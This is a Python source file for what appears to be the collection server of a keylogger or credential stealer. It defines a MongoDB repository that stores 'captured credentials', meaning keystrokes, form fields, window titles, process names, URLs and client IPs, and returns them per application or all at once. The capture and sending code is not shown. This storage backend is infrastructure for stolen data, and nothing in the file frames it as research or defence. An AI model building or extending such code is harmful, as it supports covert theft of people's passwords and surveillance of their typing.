import logging
from typing import Dict, List
import datetime
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, PyMongoError
from interfaces.credential_repository import ICredentialRepository

logger = logging.getLogger("CredentialServer")

class MongoDBCredentialRepository(ICredentialRepository):
    """MongoDB implementation of ICredentialRepository"""
    
    def __init__(self, connection_string: str, database: str, collection: str):
        """Initialize with MongoDB connection string, database and collection names"""
        self.connection_string = connection_string
        self.database_name = database
        self.collection_name = collection
        self.client = None
        self.db = None
        self.collection = None
        self._connect()
    
    def _connect(self):
        """Establish connection to MongoDB"""
        try:
            logger.debug(f"Connecting to MongoDB with database: {self.database_name}, collection: {self.collection_name}")
            self.client = MongoClient(self.connection_string)
            
            # Test the connection
            self.client.admin.command('ping')
            logger.info("MongoDB connection established successfully")
            
            # Get database and collection
            self.db = self.client[self.database_name]
            self.collection = self.db[self.collection_name]
            
        except ConnectionFailure as e:
            logger.error(f"MongoDB connection failed: {e}")
            raise
        except Exception as e:
            logger.error(f"Error initializing MongoDB repository: {e}")
            raise
    
    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict], client_ip: str = None) -> str:
        """Save captured credentials with client IP and return document ID"""
        try:
            # Create document to insert
            document = {
                "app_name": application_info.get("app_name", "unknown"),
                "window_title": application_info.get("window_title", ""),
                "process_name": application_info.get("process_name", ""),
                "url": application_info.get("url", ""),
                "timestamp": application_info.get("timestamp", datetime.datetime.now()),
                "form_fields": form_fields,
                "keystrokes": keystrokes
            }
            
            # Add client_ip as a top-level field in the document
            if client_ip:
                document["client_ip"] = client_ip
                logger.debug(f"Adding client_ip to document: {client_ip}")
            
            # Also check if client_ip is in application_info
            if application_info.get("client_ip"):
                document["client_ip"] = application_info.get("client_ip")
                logger.debug(f"Found client_ip in application_info: {application_info.get('client_ip')}")
            
            # Log the document being saved (without sensitive data)
            logger.info(f"Saving credentials for {document['app_name']} with client_ip: {document.get('client_ip', 'not provided')}")
            
            # Insert the document
            result = self.collection.insert_one(document)
            document_id = str(result.inserted_id)
            logger.info(f"Successfully saved credentials with ID: {document_id}")
            
            return document_id
            
        except PyMongoError as e:
            logger.error(f"Error saving credentials to MongoDB: {e}")
            # Fall back to returning a timestamp-based ID
            fallback_id = f"error_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
            logger.error(f"Returning fallback ID: {fallback_id}")
            return fallback_id
    
    def get_credentials_by_app(self, app_name: str) -> List[Dict]:
        """Retrieve credentials by application name"""
        try:
            logger.debug(f"Retrieving credentials for app: {app_name}")
            cursor = self.collection.find({"app_name": app_name})
            result = list(cursor)
            logger.debug(f"Found {len(result)} credentials for {app_name}")
            return result
        except PyMongoError as e:
            logger.error(f"Error retrieving credentials by app name: {e}")
            return []
    
    def get_all_credentials(self) -> List[Dict]:
        """Retrieve all stored credentials"""
        try:
            logger.debug("Retrieving all credentials")
            cursor = self.collection.find({})
            result = list(cursor)
            logger.debug(f"Found {len(result)} total credentials")
            return result
        except PyMongoError as e:
            logger.error(f"Error retrieving all credentials: {e}")
            return []